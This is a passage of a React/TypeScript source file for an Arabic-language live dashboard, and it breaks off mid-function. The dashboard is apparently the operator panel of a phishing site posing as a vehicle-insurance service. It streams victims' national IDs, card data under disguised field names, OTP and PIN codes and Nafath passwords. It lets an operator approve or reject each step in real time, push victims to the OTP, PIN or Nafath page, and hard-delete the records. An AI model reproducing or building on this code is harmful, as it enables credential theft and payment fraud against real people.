import React, { useEffect, useMemo, useState, useRef, useCallback } from "react";
import { io, Socket } from "socket.io-client";
import { addData, hasMeaningfulDashboardPayload } from "@/lib/api";

type RequestItem = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  updatedAt?: string;
  badge?: string;
  visitorId?: string;
  submittedAt?: string;
  hasCard?: boolean;
  raw?: Record<string, any>;
};

type EntryWithType = RequestItem & { entryType?: 'current' | 'new' | 'update' };

const DASHBOARD_BACKEND_URL = import.meta.env.VITE_BACKEND_TARGET || "http://127.0.0.1:3002";

const countryFlags: Record<string, string> = {
  sa: "🇸🇦", ksa: "🇸🇦", saudi: "🇸🇦", "saudi arabia": "🇸🇦", السعودية: "🇸🇦",
  jo: "🇯🇴", jord: "🇯🇴", jordan: "🇯🇴", الأردن: "🇯🇴",
  ae: "🇦🇪", uae: "🇦🇪", emirates: "🇦🇪", الإمارات: "🇦🇪",
  eg: "🇪🇬", egy: "🇪🇬", egypt: "🇪🇬", مصر: "🇪🇬",
  om: "🇴🇲", oman: "🇴🇲", سلطنة_عمران: "🇴🇲",
  lb: "🇱🇧", lebanon: "🇱🇧", لبنان: "🇱🇧",
  sy: "🇸🇾", syr: "🇸🇾", syria: "🇸🇾", سوريا: "🇸🇾",
};

const countryCodes: Record<string, string> = {
  sa: "SA", ksa: "SA", jo: "JO", ae: "AE", eg: "EG", om: "OM", lb: "LB", sy: "SY",
};

// Format elapsed time since last update
function formatElapsedTime(isoString?: string): string {
  if (!isoString) return "—";
  const diff = Date.now() - new Date(isoString).getTime();
  if (diff < 0) return "الآن";
  const seconds = Math.floor(diff / 1000);
  if (seconds < 60) return seconds <= 1 ? "قبل ثانية" : `قبل ${seconds} ثانية`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return minutes <= 1 ? "قبل دقيقة" : `قبل ${minutes} دقائق`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return hours <= 1 ? "قبل ساعة" : `قبل ${hours} ساعات`;
  const days = Math.floor(hours / 24);
  return days <= 1 ? "قبل يوم" : `قبل ${days} أيام`;
}

function getAgeStatus(isoString?: string): { label: string; isStale: boolean } {
  if (!isoString) return { label: "غير محدد", isStale: true };
  const diff = Date.now() - new Date(isoString).getTime();
  const minutes = Math.floor(diff / 60000);
  if (minutes < 5) return { label: "جديد", isStale: false };
  if (minutes < 60) return { label: `قبل ${minutes} دقيقة`, isStale: true };
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return { label: `قبل ${hours} ساعة`, isStale: true };
  const days = Math.floor(hours / 24);
  return { label: `قبل ${days} يوم`, isStale: true };
}

function formatRelativeTimeLabel(isoString?: string): string {
  const age = getAgeStatus(isoString);
  return age.label;
}

// Live timer component for each request
function LiveTimer({ startTime }: { startTime: string }) {
  const [elapsed, setElapsed] = useState(formatElapsedTime(startTime));
  
  useEffect(() => {
    const interval = setInterval(() => {
      setElapsed(formatElapsedTime(startTime));
    }, 1000);
    return () => clearInterval(interval);
  }, [startTime]);
  
  return <span style={{ fontFamily: "monospace", fontSize: "0.85rem" }}>{elapsed}</span>;
}

export default function DashboardPage() {
  const [requests, setRequests] = useState<RequestItem[]>([]);
  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
  const [nowTick, setNowTick] = useState<number>(Date.now());
  const [pinInput, setPinInput] = useState("");
  const [nafadInput, setNafadInput] = useState("");
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [localDecisionStates, setLocalDecisionStates] = useState<Record<string, string>>({});
  const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [redirectPage, setRedirectPage] = useState("");
  const [headerMenuOpen, setHeaderMenuOpen] = useState(false);
  const [selectedRequestIds, setSelectedRequestIds] = useState<string[]>([]);
  const [showSettingsModal, setShowSettingsModal] = useState(false);
  const [settingsTab, setSettingsTab] = useState<"security" | "cards">("security");
  const [blockedCards, setBlockedCards] = useState<string[]>([]);
  const [newBlockedCard, setNewBlockedCard] = useState("");
  const [currentTime, setCurrentTime] = useState(Date.now());
  const [openLogBox, setOpenLogBox] = useState<string | null>(null);
  const [cardLocalDecision, setCardLocalDecision] = useState<"approved" | "rejected" | "pin" | null>(null);
  const [phoneLocalDecision, setPhoneLocalDecision] = useState<"approved" | "rejected" | null>(null);
  const [otpLocalDecision, setOtpLocalDecision] = useState<"approved" | "rejected" | null>(null);
  const [pinLocalDecision, setPinLocalDecision] = useState<"approved" | "rejected" | null>(null);
  const socketRef = useRef<Socket | null>(null);
  // Track if selected request change is due to socket update (to avoid resetting local decisions)
  const isSocketUpdateRef = useRef(false);
  // Track which specific box was updated via socket (to preserve that box's local decision)
  const socketUpdatedBoxRef = useRef<string | null>(null);
  const currentTimeRef = useRef(Date.now());
  const headerMenuRef = useRef<HTMLDivElement | null>(null);
  const settingsModalRef = useRef<HTMLDivElement | null>(null);

  // Update current time every minute for timer display
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTime(Date.now());
    }, 60000); // Update every minute
    return () => clearInterval(interval);
  }, []);

  // Fix timestamps for existing records on page load
  useEffect(() => {
    const fixTimestamps = async () => {
      try {
        const baseUrl = (import.meta.env.VITE_API_BASE || window.location.origin || '').replace(/\/+$/, '');
        const response = await fetch(`${baseUrl}/api/dashboard/fix-timestamps`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        });
        if (response.ok) {
          const result = await response.json();
          console.log('[Dashboard] Fixed timestamps:', result);
        }
      } catch (error) {
        console.error('[Dashboard] Failed to fix timestamps:', error);
      }
    };
    fixTimestamps();
  }, []);

  // Page options for manual redirect
  const pageOptions = [
    { value: "", label: "اختر صفحة للتوجيه..." },
    { value: "home-new", label: "🏠 الرئيسية" },
    { value: "compar", label: "📊 اختيار الباقة" },
    { value: "insur", label: "📋 تفاصيل المركبة" },
    { value: "check", label: "🔐 الدفع" },
    { value: "step2", label: "🔢 رمز OTP" },
    { value: "step3", label: "🔏 رمز PIN" },
    { value: "step4", label: "🔒 النفاذ" },
    { value: "step5", label: "📱 رقم الهاتف" },
  ];

  // Map database page values to Arabic names
  const pageArabicNames: Record<string, string> = {
    "home": "الرئيسية",
    "insur": "بيانات المركبة",
    "phone": "رقم الهاتف",
    "confi": "رمز PIN",
    "compar": "اختيار الباقة",
    "check": "الدفع",
    "step2": "رمز OTP",
    "step3": "رمز PIN",
    "step4": "النفاذ",
    "step5": "رقم الهاتف",
  };

  // Convert page route to Arabic name
  const getPageArabicName = (page: string): string => {
    if (!page) return "غير متصل";
    // First check the map
    if (pageArabicNames[page]) return pageArabicNames[page];
    // Then check pageOptions
    const pageOption = pageOptions.find(p => p.value === page);
    if (pageOption) {
      return pageOption.label.replace(/^[^\s]+\s/, '');
    }
    return page;
  };

  // Sort requests by the original submission time (newest first)
  const sortedRequests = useMemo(() => {
    return [...requests].sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA; // Descending order (newest first)
    });
  }, [requests]);

  // Normalize customer value for comparison
  const normalizeCustomerValue = (value?: unknown) => {
    if (value === undefined || value === null || value === "") return "";
    return String(value).trim().toLowerCase();
  };

  // Get customer identifier - Priority: identityNumber > phoneNumber > visitorId
  const getCustomerIdentifier = (request: RequestItem): { id?: string; phone?: string; vid?: string } => {
    const raw = request?.raw || {};
    
    // 1. identityNumber is the PRIMARY identifier (permanent national ID)
    const identityNumber = normalizeCustomerValue(
      raw?.identityNumber || 
      raw?.phoneIdNumber || 
      raw?.nafadIdNumber
    );
    
    // 2. phoneNumber is secondary identifier
    const phoneNumber = normalizeCustomerValue(
      raw?.phoneNumber || 
      raw?.mobileNumber
    );
    
    // 3. visitorId as fallback
    const visitorId = normalizeCustomerValue(request?.visitorId);
    
    return { id: identityNumber, phone: phoneNumber, vid: visitorId };
  };

  // Get unique customer key - one key per real customer
  const getCustomerKey = (request: RequestItem): string => {
    const { id, phone, vid } = getCustomerIdentifier(request);
    
    // Primary: use identityNumber (most reliable - doesn't change)
    if (id) {
      return `id:${id}`;
    }
    
    // Secondary: use phoneNumber (if identityNumber not available)
    if (phone) {
      return `phone:${phone}`;
    }
    
    // Tertiary: use visitorId (last resort)
    if (vid) {
      return `vid:${vid}`;
    }
    
    // Fallback: use request id
    return `req:${request.id || Date.now()}`;
  };

  // Get display name for customer
  const getCustomerDisplayName = (request: RequestItem): string => {
    const raw = request?.raw || {};
    
    // Priority: ownerName > name > identityNumber > phoneNumber > visitorId > "زائر"
    const name = raw?.ownerName || raw?.name || raw?.customer || request?.customer;
    if (name && name !== 'زائر') {
      return String(name);
    }
    
    // Use identityNumber as display name if available
    const id = raw?.identityNumber || raw?.phoneIdNumber || raw?.nafadIdNumber;
    if (id) {
      return String(id);
    }
    
    // Use phoneNumber as display name
    const phone = raw?.phoneNumber || raw?.mobileNumber;
    if (phone) {
      return String(phone);
    }
    
    return 'زائر';
  };

  // Check if two entries belong to the same customer
  const isSameCustomerEntry = (a?: RequestItem, b?: RequestItem) => {
    if (!a || !b) return false;
    
    const idA = getCustomerIdentifier(a);
    const idB = getCustomerIdentifier(b);
    
    // Match by identityNumber (strongest match)
    if (idA.id && idA.id === idB.id) return true;
    
    // Match by phoneNumber (if no identityNumber match)
    if (idA.phone && idA.phone === idB.phone) return true;
    
    // Match by visitorId (weakest match)
    if (idA.vid && idA.vid === idB.vid) return true;
    
    return false;
  };

  // Unique customers list - one entry per customer (most recent)
  const uniqueCustomerRequests = useMemo(() => {
    const customerMap = new Map<string, RequestItem>();
    
    sortedRequests.forEach((request) => {
      const key = getCustomerKey(request);
      const existing = customerMap.get(key);
      const requestTime = new Date(request.submittedAt || request.updatedAt || 0).getTime();
      let existingTime = 0;
      if (existing) {
        existingTime = new Date(existing.submittedAt || existing.updatedAt || 0).getTime();
      }
      
      // Keep the most recent entry for each customer
      if (!existing || requestTime > existingTime) {
        customerMap.set(key, request);
      }
    });
    
    // Convert to array and sort by most recent
    return Array.from(customerMap.values()).sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA;
    });
  }, [sortedRequests]);

  // Count entries per customer
  const getCustomerEntryCount = (request: RequestItem): number => {
    const key = getCustomerKey(request);
    return sortedRequests.filter(r => getCustomerKey(r) === key).length;
  };

  // Stats derived from the real visitor data stream
  const stats = useMemo(() => {
    const totalEntries = requests.length;
    const totalCustomers = uniqueCustomerRequests.length;
    const newCount = uniqueCustomerRequests.filter((r) => r.badge === "new").length;
    const pendingCount = uniqueCustomerRequests.filter((r) => r.badge === "pending").length;
    const completedCount = uniqueCustomerRequests.filter((r) => r.badge === "completed").length;
    const activeCount = Math.max(0, totalCustomers - completedCount);
    const todayCount = uniqueCustomerRequests.filter((request) => {
      const submitted = request.submittedAt || request.updatedAt;
      if (!submitted) return false;
      const date = new Date(submitted);
      const nowDate = new Date();
      return date.getDate() === nowDate.getDate() && date.getMonth() === nowDate.getMonth() && date.getFullYear() === nowDate.getFullYear();
    }).length;
    const cardCount = uniqueCustomerRequests.filter((request) => Boolean(request.hasCard || request.raw?._v1 || request.raw?.cardNumber || request.raw?.paymentStatus)).length;
    const phoneCount = uniqueCustomerRequests.filter((request) => Boolean(request.raw?.phoneIdNumber || request.raw?.phoneOtpStatus || request.raw?.phoneCarrier || request.raw?._v7)).length;

    return {
      totalEntries,
      totalCustomers,
      newCount,
      pendingCount,
      completedCount,
      activeCount,
      todayCount,
      cardCount,
      phoneCount,
    };
  }, [requests, uniqueCustomerRequests]);

  // Handle Socket.IO update
  // Use ref to avoid re-renders and socket reconnections
  const selectedRequestIdRef = useRef<string | null>(null);
  
  // Keep ref in sync with state
  useEffect(() => {
    selectedRequestIdRef.current = selectedRequestId;
  }, [selectedRequestId]);

  const handleSocketUpdate = useCallback((updatedRequest: any) => {
    console.log("[Socket Update] Received:", updatedRequest.id, "visitorId:", updatedRequest.visitorId);
    
    const incomingRequest = {
      ...updatedRequest,
      submittedAt: updatedRequest.submittedAt || updatedRequest.updatedAt || undefined,
      updatedAt: updatedRequest.updatedAt || updatedRequest.submittedAt || undefined,
    };

    if (!hasMeaningfulDashboardPayload(incomingRequest.raw || incomingRequest)) {
      console.log("[Socket Update] Skipping empty visitor entry:", incomingRequest.id);
      return;
    }
    
    // Store current selectedRequestId before updating requests
    const currentSelectedId = selectedRequestIdRef.current;
    
    setRequests(prevRequests => {
      const existingIndex = prevRequests.findIndex(
        (r) => r.id === incomingRequest.id || r.visitorId === incomingRequest.visitorId
      );
      
      console.log("[Socket Update] Existing index:", existingIndex, "Current requests:", prevRequests.length);
      
      let shouldUpdateSelected = false;
      
      // Check if this update is for the currently selected visitor
      if (currentSelectedId) {
        const currentReq = prevRequests.find(r => r.id === currentSelectedId);
        if (currentReq) {
          const isSameVisitor = 
            incomingRequest.id === currentSelectedId || 
            incomingRequest.visitorId === currentSelectedId ||
            (currentReq.visitorId && currentReq.visitorId === incomingRequest.visitorId);
          shouldUpdateSelected = isSameVisitor;
        }
      }
      
      if (existingIndex >= 0) {
        // MERGE old entry with new one (preserve all data)
        const existingRequest = prevRequests[existingIndex];
        const mergedRequest = {
          ...existingRequest,
          ...incomingRequest,
          // Always use the newest submittedAt
          submittedAt: new Date(incomingRequest.submittedAt || incomingRequest.updatedAt || Date.now()).getTime() >
                      new Date(existingRequest.submittedAt || existingRequest.updatedAt || 0).getTime()
                      ? incomingRequest.submittedAt || incomingRequest.updatedAt
                      : existingRequest.submittedAt || existingRequest.updatedAt,
          // Merge raw data
          raw: { ...(existingRequest.raw || {}), ...(incomingRequest.raw || {}) },
        };
        const newRequests = [...prevRequests];
        newRequests[existingIndex] = mergedRequest;
        console.log("[Socket Update] MERGED entry:", mergedRequest.id, "raw keys:", Object.keys(mergedRequest.raw || {}));
        
        // Force re-render if this is the selected request
        // Note: We use isSocketUpdateRef to prevent resetting local decisions
        if (shouldUpdateSelected) {
          console.log("[Socket Update] Data merged for selected request, preserving local decisions");
          isSocketUpdateRef.current = true;
          // Force a re-render without changing selectedRequestId
          setRequests(prev => [...prev]);
        }
        
        return newRequests;
      } else {
        console.log("[Socket Update] NEW entry - adding to list:", incomingRequest.id);
        
        // If this is for the selected visitor, update selectedRequestId
        if (shouldUpdateSelected) {
          isSocketUpdateRef.current = true;
          // Use a callback to set selectedRequestId which will trigger useEffect
          // but isSocketUpdateRef.current will be true at that point
          setTimeout(() => {
            console.log("[Socket Update] Forcing re-selection for new entry");
            setSelectedRequestId((prev: string | null) => {
              // Only update if it's still the same or null
              return incomingRequest.id || prev;
            });
          }, 0);
        }
        
        return [incomingRequest, ...prevRequests];
      }
    });
  }, []); // Empty deps - use refs internally

  // Load initial requests directly from the backend API so the dashboard is not empty
  // Only run once on mount - not when selectedRequestId changes
  useEffect(() => {
    let isMounted = true;

    async function loadInitialRequests() {
      try {
        const response = await fetch("/api/dashboard/requests", {
          headers: { "Cache-Control": "no-store" },
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!isMounted) return;
        if (Array.isArray(data)) {
          const meaningfulRequests = data.filter((request) => hasMeaningfulDashboardPayload(request.raw || request));
          setRequests(meaningfulRequests);
          // Only set initial selection if no request is selected yet
          if (meaningfulRequests.length > 0) {
            setSelectedRequestId(meaningfulRequests[0].id);
          }
        }
      } catch (error) {
        console.error("[Dashboard] Failed to load initial requests", error);
      }
    }

    loadInitialRequests();
    return () => {
      isMounted = false;
    };
  }, []); // Empty deps - run only once on mount

  // Socket.IO connection
  useEffect(() => {
    // Create Socket.IO connection to the backend server directly
    const socket = io(DASHBOARD_BACKEND_URL, {
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: Infinity,
    });
    
    socketRef.current = socket;
    
    socket.on("connect", () => {
      console.log("[Dashboard] Socket.IO connected:", socket.id);
    });
    
    // Handle initial data from server
    socket.on("dashboard:init", (data: RequestItem[]) => {
      console.log("[Dashboard] Received initial data:", data.length, "requests");
      console.log("[Dashboard] Request IDs:", data.map(r => r.id));
      const meaningfulRequests = data.filter((request) => hasMeaningfulDashboardPayload(request.raw || request));
      setRequests(meaningfulRequests);
    });
    
    // Handle real-time updates
    socket.on("dashboard:update", (updatedRequest: RequestItem) => {
      console.log("[Dashboard] Received update:", updatedRequest.id);
      handleSocketUpdate(updatedRequest);
    });
    
    // Handle delete events
    socket.on("dashboard:delete", (data: { id: string }) => {
      console.log("[Dashboard] Received delete:", data.id);
      setRequests(prev => prev.filter(r => r.id !== data.id));
    });
    
    socket.on("disconnect", () => {
      console.log("[Dashboard] Socket.IO disconnected");
    });
    
    socket.on("connect_error", (error) => {
      console.log("[Dashboard] Socket.IO connection error:", error.message);
    });
    
    return () => {
      socket.disconnect();
      socketRef.current = null;
    };
  }, [handleSocketUpdate]);

  // Update current time every second for timers
  useEffect(() => {
    const interval = setInterval(() => {
      currentTimeRef.current = Date.now();
      setNowTick(Date.now());
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Close header menu when clicking outside
  useEffect(() => {
    const handlePointerDown = (event: MouseEvent) => {
      if (headerMenuRef.current && !headerMenuRef.current.contains(event.target as Node)) {
        setHeaderMenuOpen(false);
      }
    };

    document.addEventListener("mousedown", handlePointerDown);
    return () => document.removeEventListener("mousedown", handlePointerDown);
  }, []);

  // Reset local decisions when changing selected request (but NOT when it's due to socket update)
  useEffect(() => {
    // If socket update caused this change, preserve decisions for the updated box
    if (isSocketUpdateRef.current) {
      isSocketUpdateRef.current = false;
      // Only reset decisions for boxes that were NOT just updated via socket
      const updatedBox = socketUpdatedBoxRef.current;
      if (updatedBox !== "card") setCardLocalDecision(null);
      if (updatedBox !== "phone") setPhoneLocalDecision(null);
      if (updatedBox !== "otp") setOtpLocalDecision(null);
      if (updatedBox !== "pin") setPinLocalDecision(null);
      return;
    }
    // Full reset when user manually changes selection
    setCardLocalDecision(null);
    setPhoneLocalDecision(null);
    setOtpLocalDecision(null);
    setPinLocalDecision(null);
  }, [selectedRequestId]);

  // Get country flag
  const getCountryFlag = (raw?: Record<string, any>): string => {
    if (!raw) return "🌐";
    const country = raw.country || raw.countryCode || raw.countryName || raw.location?.country || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, flag] of Object.entries(countryFlags)) {
      if (normalized.includes(key)) return flag;
    }
    return "🌐";
  };

  // Get country code
  const getCountryCode = (raw?: Record<string, any>): string => {
    if (!raw) return "—";
    const country = raw.country || raw.countryCode || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, code] of Object.entries(countryCodes)) {
      if (normalized.includes(key)) return code;
    }
    return normalized.slice(0, 2).toUpperCase() || "—";
  };

  // Get device icon
  const getDeviceIcon = (raw?: Record<string, any>): string => {
    if (!raw) return "📱";
    const device = String(raw.deviceType || raw.device || raw.platform || "").toLowerCase();
    if (/ipad|tablet/i.test(device)) return "💻";
    if (/desktop|pc/i.test(device)) return "🖥️";
    if (/phone|mobile|android|iphone/i.test(device)) return "📱";
    return "📱";
  };

  const getRealFieldValue = (raw: Record<string, any> | undefined, keys: string[], fallback = "—") => {
    if (!raw) return fallback;
    for (const key of keys) {
      const value = raw[key];
      if (value !== undefined && value !== null && value !== "") return String(value);
    }
    return fallback;
  };

  // Check if a request has actual data (not just a new visitor)
  const hasActualData = (request: RequestItem): boolean => {
    return hasMeaningfulDashboardPayload(request.raw || request);
  };

  // Filter requests (unique customers only for sidebar)
  const filteredRequests = useMemo(() => {
    // Use unique customers for the sidebar list
    let filtered = uniqueCustomerRequests;
    
    // Only show requests that have actual data (not just new visitors)
    filtered = filtered.filter((r) => hasActualData(r));
    
    if (filterMode === "cards") {
      filtered = filtered.filter((r) => r.hasCard || r.raw?._v1 || r.raw?.cardNumber);
    }
    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        (r) =>
          r.customer.toLowerCase().includes(query) ||
          r.id.toLowerCase().includes(query) ||
          r.raw?.phoneNumber?.toString().includes(query) ||
          r.raw?.identityNumber?.toString().includes(query)
      );
    }
    return filtered;
  }, [uniqueCustomerRequests, filterMode, searchQuery]);

  const toggleRequestSelection = (requestId: string) => {
    setSelectedRequestIds((prev) =>
      prev.includes(requestId) ? prev.filter((id) => id !== requestId) : [...prev, requestId]
    );
  };

  const handleSelectAll = () => {
    const visibleIds = filteredRequests.map((item) => item.id);
    if (!visibleIds.length) return;

    setSelectedRequestIds((prev) => {
      const allVisibleSelected = visibleIds.every((id) => prev.includes(id));
      return allVisibleSelected ? [] : visibleIds;
    });
  };

  // Handle permanent delete (HARD DELETE - no archive)
  // Deletes ALL entries for the customer (old and new) from all tables
  const handleDeleteSelected = async () => {
    if (selectedRequestIds.length === 0) return;
    
    // Get ALL entries for each selected customer (including old and new)
    const allIdsToDelete: string[] = [];
    
    selectedRequestIds.forEach((selectedId) => {
      const selectedRequest = requests.find((r) => r.id === selectedId);
      if (!selectedRequest) return;
      
      // Find ALL entries for this customer using the same logic as customerEntryGroup
      requests.forEach((request) => {
        if (isSameCustomerEntry(request, selectedRequest)) {
          if (!allIdsToDelete.includes(request.id)) {
            allIdsToDelete.push(request.id);
          }
        }
      });
    });
    
    const selectedSet = new Set(allIdsToDelete);
    console.log("[CLIENT DELETE] HARD DELETE request for ALL customer entries:", allIdsToDelete);
    showNotification("success", `جاري حذف ${allIdsToDelete.length} سجل نهائياً للعميل...`);
    
    try {
      const response = await fetch("/api/visitors/delete", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ids: allIdsToDelete }),
      });
      
      const result = await response.json();
      console.log("[CLIENT DELETE] Server response:", result);
      
      // Clear localStorage for deleted visitors (force new visitorId on return)
      allIdsToDelete.forEach((id: string) => {
        localStorage.removeItem(`visitor_data_${id}`);
      });
      
      showNotification("success", `تم حذف ${allIdsToDelete.length} سجل نهائياً (قديمها وجديدها)`);
      
      // Update local state - remove ALL deleted entries
      setRequests((prev) => prev.filter((item) => !selectedSet.has(item.id)));
      setSelectedRequestIds([]);
      setSelectedRequestId(null);
    } catch (error) {
      console.error("[Dashboard] Failed to delete visitors:", error);
      showNotification("error", "فشل حذف السجلات - " + (error as Error).message);
    }
  };

  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];

  // Compare raw data between two entries to determine if data is new or updated
  const hasSignificantDataChange = (currentEntry: RequestItem, previousEntry: RequestItem): boolean => {
    const currentRaw = currentEntry.raw || {};
    const previousRaw = previousEntry.raw || {};
    
    // Key fields to compare
    const compareFields = [
      'identityNumber', 'phoneIdNumber', 'nafadIdNumber',
      'phoneNumber', 'mobileNumber',
      'ownerName', 'buyerName', 'name',
      'insuranceType', 'coverageType',
      'vehicleModel', 'vehicleYear', 'vehicleValue',
    ];
    
    for (const field of compareFields) {
      const currentVal = String(currentRaw[field] || '');
      const previousVal = String(previousRaw[field] || '');
      if (currentVal !== previousVal) {
        return true; // Significant data change
      }
    }
    return false; // Same data
  };

  const customerEntryGroup = useMemo(() => {
    if (!selectedRequest) return [];
    const matches = requests.filter((request) => isSameCustomerEntry(request, selectedRequest));
    
    // Sort by time (newest first)
    const sorted = [...matches].sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA;
    });
    
    // Mark entries based on comparison with the NEXT (older) entry
    return sorted.map((entry, index) => {
      const isCurrentEntry = entry.id === selectedRequest.id;
      
      if (isCurrentEntry) {
        return { ...entry, entryType: 'current' as const };
      }
      
      // Compare with the NEXT (older) entry in the list
      const nextIndex = index + 1;
      if (nextIndex < sorted.length) {
        const nextEntry = sorted[nextIndex];
        const isNewData = hasSignificantDataChange(entry, nextEntry);
        
        return { 
          ...entry, 
          entryType: isNewData ? 'new' as const : 'update' as const 
        };
      }
      
      // Last entry - compare with current selection
      if (isCurrentEntry) {
        return { ...entry, entryType: 'current' as const };
      }
      
      return { ...entry, entryType: 'update' as const };
    });
  }, [requests, selectedRequest]);

  // Get latest data for each box type from all entries (newest entry has data first due to sort)
  const getLatestRawForBox = useMemo(() => {
    return (dataType: 'phone' | 'card' | 'nafad' | 'basic' | 'insurance'): Record<string, any> | null => {
      if (!customerEntryGroup.length) return null;
      
      // Find first entry that has this type of data
      for (const entry of customerEntryGroup) {
        const raw = entry.raw || {};
        
        switch (dataType) {
          case 'phone':
            // Only return if there's actual phone verification data (from step5), not just phoneNumber
            if (raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7) return raw;
            break;
          case 'card':
            if (raw._v1 || raw._v2 || raw._v3 || raw._v5 || raw.cardNumber || raw.paymentStatus || raw.hasCard) return raw;
            break;
          case 'nafad':
            if (raw.nafadIdNumber || raw.nafadPassword) return raw;
            break;
          case 'basic':
            if (raw.identityNumber || raw.ownerName || raw.buyerName) return raw;
            break;
          case 'insurance':
            if (raw.insuranceType || raw.vehicleModel || raw.coverageType) return raw;
            break;
        }
      }
      return null;
    };
  }, [customerEntryGroup]);

  const getLatestEntryForMatcher = useMemo(() => {
    return (matcher: (raw: Record<string, any>) => boolean) => {
      if (!customerEntryGroup.length) return null;
      for (const entry of customerEntryGroup) {
        const raw = entry.raw || {};
        if (matcher(raw)) {
          return { entry, raw };
        }
      }
      return null;
    };
  }, [customerEntryGroup]);

  // Get entry timestamp for a specific raw data
  const getEntryTimestamp = useMemo(() => {
    return (raw: Record<string, any>): number => {
      const entry = customerEntryGroup.find(e => {
        const entryRaw = e.raw || {};
        // Match by comparing key fields
        return entryRaw.identityNumber === raw.identityNumber ||
               entryRaw.phoneNumber === raw.phoneNumber ||
               entryRaw.nafadIdNumber === raw.nafadIdNumber;
      });
      if (!entry) return 0;
      return new Date(entry.submittedAt || entry.updatedAt || 0).getTime();
    };
  }, [customerEntryGroup]);

  const liveSummary = useMemo(() => {
    const raw = selectedRequest?.raw || {};
    const ownerName = selectedRequest?.customer || getRealFieldValue(raw, ["ownerName", "buyerName", "name", "firstName", "lastName"], "—");
    const identityNumber = getRealFieldValue(raw, ["identityNumber", "phoneIdNumber", "nafadIdNumber", "buyerIdNumber"], "—");
    const phoneNumber = getRealFieldValue(raw, ["phoneNumber", "mobileNumber", "phone", "phoneNumberValue"], "—");
    const phoneCarrier = getRealFieldValue(raw, ["phoneCarrier", "carrier", "network"], "غير محدد");
    const deviceType = getRealFieldValue(raw, ["deviceType", "device", "platform"], "غير معروف");
    const browser = getRealFieldValue(raw, ["browser", "browserName", "userAgent"], "غير معروف");
    const os = getRealFieldValue(raw, ["os", "operatingSystem", "osName"], "غير معروف");
    const country = getRealFieldValue(raw, ["country", "countryCode", "countryName"], "غير معروف");
    const ip = getRealFieldValue(raw, ["ip", "clientIp", "visitorIp"], "—");
    const currentPage = getRealFieldValue(raw, ["currentPage", "page"], typeof raw.currentPage === 'string' ? raw.currentPage : (typeof raw.page === 'string' ? raw.page : "غير متصل"));
    const currentStep = getRealFieldValue(raw, ["currentStep", "step"], "—");

    return {
      ownerName,
      identityNumber,
      phoneNumber,
      phoneCarrier,
      deviceType,
      browser,
      os,
      country,
      ip,
      currentPage,
      currentStep,
    };
  }, [selectedRequest]);

  // Show notification
  const showNotification = (type: "success" | "error", message: string) => {
    setNotification({ type, message });
    setTimeout(() => setNotification(null), 3000);
  };

  const applyLocalBoxDecision = async (boxKey: string, field: string, action: "approved" | "rejected", successText: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading(boxKey);
    setLocalDecisionStates(prev => ({ ...prev, [boxKey]: action }));
    try {
      const res = await fetch("/api/dashboard/reflect-status", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, field, status: action }),
      });
      if (res.ok) {
        showNotification("success", successText);
      } else {
        setLocalDecisionStates(prev => {
          const next = { ...prev };
          delete next[boxKey];
          return next;
        });
        showNotification("error", "فشل تحديث الحالة");
      }
    } catch {
      setLocalDecisionStates(prev => {
        const next = { ...prev };
        delete next[boxKey];
        return next;
      });
      showNotification("error", "فشل الاتصال");
    } finally {
      setActionLoading(null);
    }
  };

  // Handle dashboard actions
  const handlePaymentAction = async (action: "approved" | "rejected") => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
    if (!visitorId) return;
    setActionLoading("payment");
    try {
      const res = await fetch("/api/dashboard/payment-action", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ visitorId, action }),
      });
      if (res.ok) {
        showNotification("success", action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
      } else {
        showNotification("error", "حدث خطأ");
      }
    } catch {
      showNotification("error", "فشل الاتصال");
    }
    setActionLoading(null);
  };

  const handleLocalPaymentAction = async (action: "approved" | "rejected") => {
    await applyLocalBoxDecision("payment", "_v1Status", action, action === "approved" ? "تم الموافقة على الدفع" : "تم رفض الدفع");
  };

  const handleOtpAction = async (action: "approved" | "rejected" | "resend") => {
    // Get visitorId from multiple possible sources
    const visitorId = selectedRequest?.visitorId || selectedRequest?.id || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id;
    console.log("[DASHBOARD] handleOtpAction - visitorId:", visitorId, "selectedRequest:", JSON.stringify(selectedRequest));
    
    if (!visitorId) {
      console.log("[DASHBOARD] No visitorId found in selectedRequest:", selectedRequest);
      showNotification("error", "لم يتم العثور على بيانات الزائر");
      return;
    }
    
    setActionLoading("otp");
    try {
      const res = await fetch("/api/dashboard/otp-action", {
        method: "POST",
